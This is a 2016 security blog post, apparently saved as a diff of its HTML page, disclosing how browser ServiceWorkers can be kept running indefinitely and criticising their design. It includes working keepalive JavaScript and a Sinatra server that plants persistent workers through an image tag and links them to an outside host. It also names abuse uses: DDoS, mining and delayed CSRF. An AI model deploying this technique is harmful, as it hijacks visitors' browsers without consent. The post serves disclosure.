@@ -1,0 +1,282 @@
+
+<!doctype html>
+<html class="no-js" xmlns="https://www.w3.org/1999/xhtml"
+      xmlns:fb="https://ogp.me/ns/fb#">
+<head>
+<base href="https://sakurity.com" />
+
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+
+  <title>Building Botnet on ServiceWorkers</title>
+
+    <meta name="description" content="We do penetration testing, source code auditing and vulnerability assessments">
+    <meta name="keywords"
+          content="Billing Security, Ruby on Rails Security, OAuth Security, Bitcoin Security, Framework Vulnerabilities">
+
+
+    <link rel="icon" type="image/x-icon" href="/images/favicon.ico"/>
+    <link rel="stylesheet" href="/styles/vendor.css"/>
+    <link rel="stylesheet" href="/styles/main.css"/>
+<meta property="og:image" content="https://www.sakurity.com/images/sakurity-logo@2x.png" />
+
+
+  <link rel="canonical" href="https://sakurity.com/blog/2016/12/10/serviceworker_botnet.html">
+  <link rel="alternate" type="application/rss+xml" title="The Sakurity Blog" href="https://sakurity.com/blog/feed.xml" />
+
+
+
+
+
+
+</head>
+
+<body>
+
+
+<!--[if lt IE 10]>
+<p class="browsehappy">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade
+    your browser</a> to improve your experience.</p>
+<![endif]-->
+
+<nav class="top-bar row" data-topbar>
+    <section class="top-bar-section">
+
+        <ul class="left">
+            <li><a href="/">Home</a></li>
+            <li><a href="/blog">Blog</a></li>
+            <li><a href="/research">Research</a></li>
+            <li><a href="/contact">Contact Us</a></li>
+            <li><a href="https://twitter.com/SakurityNetwork">@SakurityNetwork</a></li>
+        </ul>
+
+    </section>
+</nav>
+    <div class="page-content">
+      <div class="wrapper">
+
+<div class="post">
+
+  <header class="post-header">
+    <h1 class="post-title">Building Botnet on ServiceWorkers</h1>
+  </header>
+
+  <article class="post-content">
+<p>TL;DR In this post I will demonstrate one of the numerous ways how ServiceWorkers let us execute Javascript code inifinitely in the browser and will rant a little bit about ServiceWorkers design.</p>
+
+<p>For demonstration <a href="https://jsfiddle.net/Lsd6vgkb/3/">visit this link</a>. Close that tab. Few minutes later open DevTools/Application/ServiceWorkers/Show All and see it running. (could be fixed by now though)</p>
+
+<p>This Catworker runs infinitely, and like a zombie, executes different tasks. No need for a malicious page, just any https:// blog allowing external images in the comments to plant the payload <code class="highlighter-rouge">&lt;img src="https://truefactor.io/cat.gif"&gt;</code>.</p>
+
+<p>Any web developer would be surprised: <b>How come an image tag leads to JS code execution? How come that JS execution is persistant? I never allowed that!</b></p>
+
+<h2 id="serviceworkers-are-overly-complex">ServiceWorkers are overly complex</h2>
+
+<p>To make “Progressive” Web Applications popular Chrome team created ServiceWorkers, and they never asked your permission. Currently the only real world use case for that “shiny tech” is to show a Push Notification popup. If you don’t believe me, open your registered service workers and inspect their contents.</p>
+
+<p>Even that simple trick is overcomplicated - <a href="https://developers.google.com/web/updates/2015/03/push-notifications-on-the-open-web#implementing_push_messaging_for_chrome">hunders of lines of code to get started, dependance on FCM etc</a>.</p>
+
+<p>Put sw.js on the server, register a worker on the client side, wait for a Promise, then serviceWorkerRegistration.pushManager.getSubscription(), extract endpoint and registration_id, save those on the server.</p>
+
+<p>Could be: <code class="highlighter-rouge">navigator.pushManager.getSubscription("We will send you weather updates once an hour").then(function(endpoint){ #FCM endpoint })</code></p>
+
+<p>In my humble opinion ServiceWorker is a beautiful answer to non existing question. It is way harder to learn than Appcache while being less secure.</p>
+
+<h2 id="how-to-keep-it-alive-for-long">How to keep it alive for long</h2>
+
+<p>ServiceWorker is killed 60 seconds after it receives last event e.g. onmessage, onfetch, onforeignfetch etc</p>
+
+<ol>
+  <li>postMessage-ing itself</li>
+</ol>
+
+<figure class="highlight"><pre><code class="language-ruby" data-lang="ruby"><span class="nb">self</span><span class="p">.</span><span class="nf">addEventListener</span><span class="p">(</span><span class="s1">'message'</span><span class="p">,</span> <span class="n">function</span> <span class="p">(</span><span class="n">event</span><span class="p">)</span> <span class="p">{</span>
+    <span class="n">var</span> <span class="n">spawnNewMessageEvent</span> <span class="o">=</span> <span class="n">function</span> <span class="p">(</span><span class="n">data</span><span class="p">)</span> <span class="p">{</span>
+        <span class="k">return</span> <span class="kp">new</span> <span class="no">Promise</span><span class="p">(</span><span class="n">function</span> <span class="p">(</span><span class="n">success</span><span class="p">)</span> <span class="p">{</span>
+            <span class="n">setTimeout</span><span class="p">(</span><span class="n">function</span> <span class="p">()</span> <span class="p">{</span>
+                <span class="n">var</span> <span class="n">sw</span> <span class="o">=</span> <span class="nb">self</span><span class="p">.</span><span class="nf">registration</span><span class="p">.</span><span class="nf">active</span><span class="p">;</span>
+                <span class="n">sw</span><span class="p">.</span><span class="nf">postMessage</span><span class="p">(</span><span class="n">data</span><span class="p">);</span>
+                <span class="n">success</span><span class="p">(</span><span class="s2">"success"</span><span class="p">);</span>
+            <span class="p">},</span> <span class="mi">30000</span><span class="p">)</span>
+        <span class="p">});</span>
+    <span class="p">};</span>
+    <span class="n">event</span><span class="p">.</span><span class="nf">waitUntil</span><span class="p">(</span><span class="n">doSomething</span><span class="p">().</span><span class="nf">then</span><span class="p">(</span><span class="n">spawnNewMessageEvent</span><span class="p">));</span>
+<span class="p">});</span></code></pre></figure>
+
+<ol>
+  <li>
+    <p>Two workers foreignfetch-ing each other. To use a ForeignFetch you need to <a href="https://bit.ly/OriginTrialSignup">apply for Origin Trial token</a> - entirely automatic process, no review/verification, and allows the attacker to use fresh experimental techniques on real users without their consent.</p>
+  </li>
+  <li>
+    <p>One catworker doing a fetch to cat.gif, which leads to registration of a new worker with different scope (it’s called Link-based registration), repeat 55 seconds later.</p>
+  </li>
+</ol>
+
+<figure class="highlight"><pre><code class="language-ruby" data-lang="ruby"><span class="nb">require</span> <span class="s1">'sinatra'</span>
+<span class="n">ot</span> <span class="o">=</span> <span class="s1">'AglMWHYLtMNT8FVZp9u368r0HZPKh7Pjfm7WYEyHwKz4zwaSznv682Bckrz903mz54CVZQACD5ZlSrLpuh8CKQIAAABYeyJvcmlnaW4iOiAiaHR0cHM6Ly90cnVlZmFjdG9yLmlvOjQ0MyIsICJmZWF0dXJlIjogIkZvcmVpZ25GZXRjaCIsICJleHBpcnkiOiAxNDg0OTM2NzI3fQ=='</span>
+
+<span class="n">get</span> <span class="s2">"/cat.gif"</span> <span class="k">do</span>
+  <span class="n">response</span><span class="p">.</span><span class="nf">headers</span><span class="p">[</span><span class="s1">'Origin-Trial'</span><span class="p">]</span> <span class="o">=</span> <span class="n">ot</span><span class="p">;</span>
+  <span class="n">response</span><span class="p">.</span><span class="nf">headers</span><span class="p">[</span><span class="s1">'Access-Control-Allow-Origin'</span><span class="p">]</span> <span class="o">=</span> <span class="s1">'*'</span><span class="p">;</span>
+  <span class="n">response</span><span class="p">.</span><span class="nf">headers</span><span class="p">[</span><span class="s1">'Link'</span><span class="p">]</span> <span class="o">=</span> <span class="s1">'&lt;/sw?'</span><span class="o">+</span><span class="nb">rand</span><span class="p">(</span><span class="mi">999999999</span><span class="p">).</span><span class="nf">to_s</span><span class="o">+</span><span class="s1">'&gt;; rel="serviceworker"; scope="/'</span><span class="o">+</span><span class="nb">rand</span><span class="p">(</span><span class="mi">999999999</span><span class="p">).</span><span class="nf">to_s</span><span class="o">+</span><span class="s1">'"'</span>
+
+  <span class="k">if</span> <span class="n">params</span><span class="p">[</span><span class="ss">:skip</span><span class="p">]</span>
+    <span class="s1">'ok'</span>
+  <span class="k">else</span>
+    <span class="n">response</span><span class="p">.</span><span class="nf">headers</span><span class="p">[</span><span class="s1">'Content-Type'</span><span class="p">]</span> <span class="o">=</span> <span class="s2">"image/gif"</span>
+    <span class="no">File</span><span class="p">.</span><span class="nf">open</span><span class="p">(</span><span class="s1">'./cat.gif'</span><span class="p">).</span><span class="nf">read</span>
+  <span class="k">end</span>
+<span class="k">end</span>
+
+<span class="n">get</span> <span class="s2">"/sw"</span> <span class="k">do</span>
+  <span class="n">response</span><span class="p">.</span><span class="nf">headers</span><span class="p">[</span><span class="s1">'Content-Type'</span><span class="p">]</span> <span class="o">=</span> <span class="s2">"text/javascript"</span>
+  <span class="k">return</span> <span class="n">sw</span><span class="o">=&lt;&lt;</span><span class="no">HTML</span><span class="sh">
+//</span><span class="si">#{</span><span class="nb">rand</span><span class="p">(</span><span class="mi">999999999</span><span class="p">).</span><span class="nf">to_s</span><span class="si">}</span><span class="sh">
+setTimeout(function(){
+  console.log("Forking")
+  fetch('https://truefactor.io/cat.gif?skip=1&amp;'+Math.random(9999999));
+}, 30000);
+</span><span class="no">HTML</span>
+<span class="k">end</span></code></pre></figure>
+
+<h2 id="how-it-can-be-abused">How it can be abused?</h2>
+
+<p>Right now, attackers could benefit from your browser in three quite dangerous ways.</p>
+
+<ol>
+  <li>
+    <p>DDoS someone (easy to stop by Referer blocklist)</p>
+  </li>
+  <li>
+    <p>memory-hard calculations like scrypt/litecoin mining. I can get only 2000 hashes/sec, but it’s completely free and can scale to millions of machines. <a href="https://developer.mozilla.org/en-US/docs/Web/API/Web_Workers_API/Functions_and_classes_available_to_workers">Look through other functions</a> available inside of a ServiceWorker.</p>
+  </li>
+  <li>
+    <p>Most dangerous, delayed CSRF. Once you find a CSRF issue on a website you can send a job to all your zombies and abuse their cookies to run some requests on their behalf.</p>
+  </li>
+</ol>
+
+<p>ServiceWorkers == persistance by design. They run after you close the tab, they randomly recieve ‘sync’ events and wake up, get updated every 24 hours, and if you allowed a website to send Push Notifications, they can also run some JS every time they show a popup. All that stuff is already in production for quite a while.</p>
+
+<p>There will be more bypasses to keep attacker’s code running. This class of bugs doesn’t get enough attention from the team. <a href="https://bugs.chromium.org/p/chromium/issues/detail?id=647943">Reports</a> <a href="https://bugs.chromium.org/p/chromium/issues/detail?id=662443">are</a> <a href="https://bugs.chromium.org/p/chromium/issues/detail?id=648836">public</a> and given very low priority.</p>
+
+<p>On top of that, <b>Origin Trials approach is flawed</b> - anyone can get a Token, anyone can abuse an experimental feature. Must be opt-in via flags only.</p>
+
+<p>I strongly believe there should be a way to switch off ServiceWorkers with a flag, because for me, it brings nothing to the table (did you read the Cache docs? it’s like rocket science), and I’m not so sure it won’t break Same Origin Policy or whatever in the future, since features are rushed to production with little review…  Here are some more low-sev vulnerabilities: <a href="https://tools.cisco.com/security/center/viewAlert.x?alertId=43522">FF</a>, <a href="https://bugs.chromium.org/p/chromium/issues/detail?id=422966">JSONP+XSS=takeover</a>, <a href="https://alf.nu/ServiceWorker">easier to take over sandbox domains</a>.</p>
+
+
+<p><a href="https://twitter.com/share" class="twitter-share-button" data-url="https://sakurity.com/blog/2016/12/10/serviceworker_botnet.html" data-text="Building Botnet on ServiceWorkers" data-via="sakuritynetwork" data-related="sakuritynetwork">Share on Twitter</a>
+<script>
+!function(d,s,id){var js,fjs=d.getElementsByTagName(s)[0],p=/^http:/.test(d.location)?'http':'https';if(!d.getElementById(id)){js=d.createElement(s);js.id=id;js.src=p+'://platform.twitter.com/widgets.js';fjs.parentNode.insertBefore(js,fjs);}}(document, 'script', 'twitter-wjs');
+</script></p>
+
+<h3>Dec 10, 2016 • Egor Homakov (<a href='https://twitter.com/homakov'>@homakov</a>)</h3>
+
+
+<h3 class="rss-subscribe">Subscribe to our blog via <a href="https://twitter.com/SakurityNetwork">Twitter @SakurityNetwork</a>, <a href="/blog/feed.xml">RSS</a> or <a href="https://feedrabbit.com/subscriptions/new?url=https://sakurity.com/blog/feed.xml">Email</a></h3>
+  </article>
+
+
+
+
+
+
+<div id="spot-im-frame-inpage" data-post-id=""></div>
+
+
+</div></div>
+
+
+
+<div class="content">
+
+<!--<section class="inverse contact-us">
+
+    <div class="row">
+        <div class="small-12 small-text-center columns">
+            <h2>Trusted by</h2>
+        </div>
+    </div>
+
+    <div class="row">
+        <div class="small-6 medium-4 large-2 small-text-center columns clients">
+          <a href="https://www.coinbase.com/">
+            <div class="client client-coinbase"></div>
+          </a>
+        </div>
+
+        <div class="small-6 medium-4 large-2 small-text-center columns clients">
+          <a href="https://www.airbnb.com/">
+            <div class="client client-airbnb"></div>
+          </a>
+        </div>
+
+        <div class="small-6 medium-4 large-2 small-text-center columns clients">
+          <a href="https://stripe.com/">
+                <div class="client client-stripe"></div>
+            </a>
+        </div>
+
+        <div class="small-6 medium-4 large-2 small-text-center columns clients">
+          <a href="https://www.uber.com/">
+            <div class="client client-uber"></div>
+          </a>
+        </div>
+
+        <div class="small-6 medium-4 large-2 small-text-center columns clients">
+          <a href="https://mixpanel.com/">
+            <div class="client client-mixpanel"></div>
+          </a>
+        </div>
+
+        <div class="small-6 medium-4 large-2 small-text-center columns clients">
+          <a href="https://wordpress.com/">
+            <div class="client client-wordpress"></div>
+          </a>
+        </div>
+    </div>
+
+
+    <div class="section-pattern">    
+        <div class="row">
+            <div class="small-10 small-centered small-text-center columns">
+
+                <p>Reach out to us if you want to see how our security audits can
+                    help your business,<br> or if you have any questions.</p>
+            </div>
+        </div>
+        <div class="row">
+            <div class="small-12 small-centered columns small-text-center">
+                <a href="/contact" class="button large pull success">Contact</a>
+            </div>
+        </div>
+    </div>
+</section>-->
+
+</div>
+
+
+
+<footer>
+    <div class="row">
+        <div class="small-6 medium-3 large-2 columns">
+            <h4>Sakurity</h4>
+            <ul>
+            <li><a href="/">Home</a></li>
+            <li><a href="/blog">Blog</a></li>
+            <li><a href="/research">Research</a></li>
+            <li><a href="/contact">Contact Us</a></li>
+            <li><a href="https://twitter.com/SakurityNetwork">@SakurityNetwork</a></li>
+            </ul>
+        </div>
+
+
+
+        <div class="small-12 medium-6 large-8 small-text-center medium-text-right columns">
+            <div class="logo-monochrome"></div>
+            <p class="copyright">Sakurity Ltd, a Hong Kong company established in 2012.<br><a href="mailto:info@sakurity.com">info@sakurity.com</a></p>
+        </div>
+    </div>
+</footer>
+</body>
+</html>
